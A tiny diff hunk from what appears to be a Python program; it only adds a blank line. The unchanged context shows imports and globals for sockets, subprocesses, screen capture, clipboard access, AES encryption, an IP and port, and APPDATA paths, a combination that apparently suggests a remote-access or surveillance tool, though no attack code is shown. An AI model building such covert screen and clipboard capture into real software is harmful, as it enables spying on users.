@@ -2,6 +2,7 @@
 import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
 from mss import mss
 from Crypto.Cipher import AES
+
 global ip,port,TMP,APPDATA,path,os_type,red,yellow,r
 
 counter = "H"*16
